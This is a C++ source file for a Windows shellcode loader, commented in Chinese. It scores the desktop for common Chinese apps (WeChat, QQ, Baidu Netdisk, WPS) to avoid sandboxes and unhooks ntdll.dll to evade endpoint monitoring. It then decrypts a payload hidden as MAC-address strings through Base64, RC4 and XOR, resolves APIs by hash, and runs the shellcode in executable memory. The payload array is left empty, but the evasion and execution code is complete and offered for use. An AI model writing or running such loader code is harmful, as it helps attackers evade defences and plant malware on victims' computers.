#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>
#include <io.h>
#include <fcntl.h>
#include <stdio.h>
#include <winternl.h>
#include <psapi.h>

#pragma warning(disable:4996)

// 解密相关函数声明
unsigned char* mac_to_data(const char** mac_array, size_t* data_len);
unsigned char* base64_decode(const char* encoded, size_t* decoded_len);
typedef struct { unsigned char S[256]; int i; int j; } RC4_CTX;
void rc4_init(RC4_CTX* ctx, const unsigned char* key, size_t key_len);
void rc4_decrypt(RC4_CTX* ctx, unsigned char* data, size_t len);
void xor_decrypt(unsigned char* data, size_t len, unsigned char key);

// 环境检测函数声明
int CountFilesInDirectory(const std::wstring& path);
bool FileExists(const std::wstring& path);
bool FindSoftwareShortcut(const std::wstring& desktopPath, const std::vector<std::wstring>& possibleNames);

// 反挂钩函数声明
DWORD UNHOOKntdll();

// API哈希相关声明
DWORD CalculateHash(const char* str);
FARPROC GetApiByHash(HMODULE hModule, DWORD targetHash);

// 函数指针类型定义
typedef LPVOID(WINAPI* PFN_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* PFN_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* PFN_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI* PFN_WaitForSingleObject)(HANDLE, DWORD);

int main() {
    // 设置控制台为Unicode模式
    _setmode(_fileno(stdout), _O_U16TEXT);
    _setmode(_fileno(stdin), _O_U16TEXT);

    // 定义要查找的软件
    std::vector<std::pair<std::wstring, std::vector<std::wstring>>> softwareList = {
        {L"微信", {L"微信.lnk", L"WeChat.lnk", L"wechat.lnk", L"微信WeChat.lnk"}},
        {L"QQ", {L"QQ.lnk", L"腾讯QQ.lnk", L"Tencent QQ.lnk", L"qq.lnk", L"TIM.lnk", L"腾讯TIM.lnk"}},
        {L"百度网盘", {L"百度网盘.lnk", L"百度云.lnk", L"百度云盘.lnk", L"BaiduNetdisk.lnk", L"Baidu Netdisk.lnk", L"BaiduYun.lnk"}},
        {L"WPS Office", {L"WPS Office.lnk", L"WPS.lnk", L"wps.lnk", L"WPS 2019.lnk", L"WPS 2023.lnk", L"金山WPS.lnk"}}
    };

    // 获取桌面路径
    wchar_t userDesktopPath[MAX_PATH];
    wchar_t publicDesktopPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, userDesktopPath);
    SHGetFolderPathW(NULL, CSIDL_COMMON_DESKTOPDIRECTORY, NULL, 0, publicDesktopPath);

    // 统计文件总数 & 查找快捷方式
    int totalFiles = CountFilesInDirectory(userDesktopPath) + CountFilesInDirectory(publicDesktopPath);
    int foundSoftwareCount = 0;
    for (const auto& software : softwareList) {
        bool found = FindSoftwareShortcut(userDesktopPath, software.second) ||
            FindSoftwareShortcut(publicDesktopPath, software.second);
        if (found) foundSoftwareCount++;
    }

    // 计算概率并判断
    int probability = foundSoftwareCount * 20 + (totalFiles > 15 ? 20 : 0);
    probability = min(probability, 100);
    std::wcout << L"检测概率: " << probability << L"%" << std::endl;
    if (probability <= 40) {
        std::wcout << L"概率低于阈值，程序退出" << std::endl;
        return 0;
    }

    // 执行ntdll反挂钩
    DWORD unhookResult = UNHOOKntdll();
    if (unhookResult != 0) {
        std::wcout << L"ntdll反挂钩失败，错误码: " << unhookResult << std::endl;
    }
    else {
        std::wcout << L"ntdll反挂钩成功" << std::endl;
    }

    // ======================================
    // 在ntdll反挂钩之后执行解密逻辑
    // ======================================

    // 加密后的MAC地址数组（需替换为加密脚本生成的内容）
    const char* mac_shellcode[] = {
       ,
    NULL  // 结束标记
    };

    // 加密时使用的密钥（必须与加密脚本一致）
    const unsigned char rc4_key[] = "MySecretKey123!@#"; // RC4密钥
    const unsigned char xor_key = 0xAB; // XOR密钥

    std::wcout << L"\n=== 在ntdll反挂钩后开始解密Shellcode ===" << std::endl;

    // 第1步：MAC格式转换为Base64数据
    size_t base64_len;
    unsigned char* base64_data = mac_to_data(mac_shellcode, &base64_len);
    if (!base64_data) {
        std::wcout << L"MAC格式转换失败" << std::endl;
        return -1;
    }
    std::wcout << L"1. MAC转Base64成功 (" << base64_len << L"字节)" << std::endl;

    // 第2步：Base64解码
    size_t rc4_len;
    unsigned char* rc4_data = base64_decode((const char*)base64_data, &rc4_len);
    free(base64_data);
    if (!rc4_data) {
        std::wcout << L"Base64解码失败" << std::endl;
        return -1;
    }
    std::wcout << L"2. Base64解码成功 (" << rc4_len << L"字节)" << std::endl;

    // 第3步：RC4解密
    RC4_CTX rc4_ctx;
    rc4_init(&rc4_ctx, rc4_key, strlen((const char*)rc4_key));
    rc4_decrypt(&rc4_ctx, rc4_data, rc4_len);
    std::wcout << L"3. RC4解密完成" << std::endl;

    // 第4步：XOR解密
    xor_decrypt(rc4_data, rc4_len, xor_key);
    std::wcout << L"4. XOR解密完成，获取原始Shellcode (" << rc4_len << L"字节)" << std::endl;

    // ======================================
    // 使用原有方式执行Shellcode
    // ======================================

    // 获取kernel32.dll句柄
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        free(rc4_data); // 释放解密的shellcode
        return -1;
    }

    // API哈希值
    DWORD HASH_VIRTUALALLOC = 0xDF894B12;
    DWORD HASH_VIRTUALPROTECT = 0x77E9F7C8;
    DWORD HASH_CREATETHREAD = 0x26662FCC;
    DWORD HASH_WAITFORSINGLEOBJECT = 0xB93BC4D5;

    // 通过哈希值获取函数指针
    PFN_VirtualAlloc pVirtualAlloc = (PFN_VirtualAlloc)GetApiByHash(hKernel32, HASH_VIRTUALALLOC);
    PFN_VirtualProtect pVirtualProtect = (PFN_VirtualProtect)GetApiByHash(hKernel32, HASH_VIRTUALPROTECT);
    PFN_CreateThread pCreateThread = (PFN_CreateThread)GetApiByHash(hKernel32, HASH_CREATETHREAD);
    PFN_WaitForSingleObject pWaitForSingleObject = (PFN_WaitForSingleObject)GetApiByHash(hKernel32, HASH_WAITFORSINGLEOBJECT);

    if (!pVirtualAlloc || !pVirtualProtect || !pCreateThread || !pWaitForSingleObject) {
        free(rc4_data); // 释放解密的shellcode
        return -1;
    }

    // 使用解密后的shellcode替换原有空shellcode
    unsigned char* cs_shellcode = rc4_data;
    SIZE_T shellcodeSize = rc4_len;

    // 若Shellcode为空，可跳过后续执行逻辑
    if (shellcodeSize == 0) {
        free(rc4_data); // 释放解密的shellcode
        return 0;
    }

    // 步骤1: 分配内存
    LPVOID pShellcodeMemory = pVirtualAlloc(
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!pShellcodeMemory) {
        free(rc4_data); // 释放解密的shellcode
        return -1;
    }

    // 步骤2: 复制Shellcode
    memcpy(pShellcodeMemory, cs_shellcode, shellcodeSize);

    // 步骤3: 创建线程执行Shellcode
    DWORD threadId;
    HANDLE hThread = pCreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pShellcodeMemory,
        NULL,
        0,
        &threadId
    );

    if (!hThread) {
        VirtualFree(pShellcodeMemory, 0, MEM_RELEASE);
        free(rc4_data); // 释放解密的shellcode
        return -1;
    }

    pWaitForSingleObject(hThread, INFINITE); // 等待线程结束
    CloseHandle(hThread);
    VirtualFree(pShellcodeMemory, 0, MEM_RELEASE);
    // 注意：此时rc4_data已被释放，因为它与cs_shellcode指向同一块内存

    return 0;
}

// ======================================
// 解密函数实现
// ======================================

// MAC格式转原始数据
unsigned char* mac_to_data(const char** mac_array, size_t* data_len) {
    size_t mac_count = 0;
    while (mac_array[mac_count] != NULL) mac_count++;
    *data_len = mac_count * 6;
    unsigned char* data = (unsigned char*)malloc(*data_len);
    if (!data) return NULL;

    for (size_t i = 0; i < mac_count; i++) {
        sscanf(mac_array[i], "%02hhx-%02hhx-%02hhx-%02hhx-%02hhx-%02hhx",
            &data[i * 6], &data[i * 6 + 1], &data[i * 6 + 2],
            &data[i * 6 + 3], &data[i * 6 + 4], &data[i * 6 + 5]);
    }
    return data;
}

// Base64解码
unsigned char* base64_decode(const char* encoded, size_t* decoded_len) {
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t len = strlen(encoded);
    *decoded_len = (len / 4) * 3;

    if (encoded[len - 1] == '=') (*decoded_len)--;
    if (encoded[len - 2] == '=') (*decoded_len)--;

    unsigned char* decoded = (unsigned char*)malloc(*decoded_len);
    if (!decoded) return NULL;

    for (size_t i = 0, j = 0; i < len; ) {
        int a = strchr(base64_chars, encoded[i++]) - base64_chars;
        int b = strchr(base64_chars, encoded[i++]) - base64_chars;
        int c = (encoded[i] == '=') ? 0 : strchr(base64_chars, encoded[i++]) - base64_chars;
        int d = (encoded[i] == '=') ? 0 : strchr(base64_chars, encoded[i++]) - base64_chars;

        decoded[j++] = (a << 2) | (b >> 4);
        if (j < *decoded_len) decoded[j++] = ((b & 0xF) << 4) | (c >> 2);
        if (j < *decoded_len) decoded[j++] = ((c & 0x3) << 6) | d;
    }
    return decoded;
}

// RC4初始化
void rc4_init(RC4_CTX* ctx, const unsigned char* key, size_t key_len) {
    for (int i = 0; i < 256; i++) ctx->S[i] = (unsigned char)i;
    for (int i = 0, j = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) & 0xFF;
        unsigned char temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }
    ctx->i = 0; ctx->j = 0;
}

// RC4解密
void rc4_decrypt(RC4_CTX* ctx, unsigned char* data, size_t len) {
    for (size_t k = 0; k < len; k++) {
        ctx->i = (ctx->i + 1) & 0xFF;
        ctx->j = (ctx->j + ctx->S[ctx->i]) & 0xFF;
        unsigned char temp = ctx->S[ctx->i];
        ctx->S[ctx->i] = ctx->S[ctx->j];
        ctx->S[ctx->j] = temp;
        data[k] ^= ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 0xFF];
    }
}

// XOR解密
void xor_decrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) data[i] ^= key;
}

// ======================================
// 环境检测函数实现
// ======================================

// 统计目录中的文件数量
int CountFilesInDirectory(const std::wstring& path) {
    int count = 0;
    std::wstring searchPath = path + L"\\*";
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(findData.cFileName, L".") && wcscmp(findData.cFileName, L"..") &&
                !(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                count++;
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    return count;
}

// 检查文件是否存在
bool FileExists(const std::wstring& path) {
    DWORD attrib = GetFileAttributesW(path.c_str());
    return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}

// 查找软件快捷方式
bool FindSoftwareShortcut(const std::wstring& desktopPath, const std::vector<std::wstring>& possibleNames) {
    for (const auto& name : possibleNames) {
        if (FileExists(desktopPath + L"\\" + name)) return true;
    }
    return false;
}

// ======================================
// 反挂钩函数实现
// ======================================

// 恢复ntdll.dll原始代码（反挂钩）
DWORD UNHOOKntdll() {
    MODULEINFO mi = {};
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 1;

    GetModuleInformation(GetCurrentProcess(), hNtdll, &mi, sizeof(mi));
    LPVOID ntdllBase = mi.lpBaseOfDll;

    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 2;

    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return 3; }

    LPVOID mapAddr = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!mapAddr) { CloseHandle(hMap); CloseHandle(hFile); return 4; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)ntdllBase + dos->e_lfanew);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(nt) + i * IMAGE_SIZEOF_SECTION_HEADER);
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD oldProt;
            VirtualProtect((LPVOID)((ULONG_PTR)ntdllBase + sec->VirtualAddress), sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProt);
            memcpy((LPVOID)((ULONG_PTR)ntdllBase + sec->VirtualAddress), (LPVOID)((ULONG_PTR)mapAddr + sec->VirtualAddress), sec->Misc.VirtualSize);
            VirtualProtect((LPVOID)((ULONG_PTR)ntdllBase + sec->VirtualAddress), sec->Misc.VirtualSize, oldProt, &oldProt);
        }
    }

    UnmapViewOfFile(mapAddr);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return 0;
}

// ======================================
// API哈希相关实现
// ======================================

// 计算字符串哈希值
DWORD CalculateHash(const char* str) {
    DWORD hash = 0;
    while (*str) hash = ((hash << 5) + hash) + *str++;
    return hash;
}

// 通过哈希值查找API地址
FARPROC GetApiByHash(HMODULE hModule, DWORD targetHash) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pAddressOfNames = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
    WORD* pAddressOfOrdinals = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* pFunctionName = (char*)((BYTE*)hModule + pAddressOfNames[i]);
        if (CalculateHash(pFunctionName) == targetHash) {
            WORD ordinal = pAddressOfOrdinals[i];
            return (FARPROC)((BYTE*)hModule + pAddressOfFunctions[ordinal]);
        }
    }
    return NULL;

}
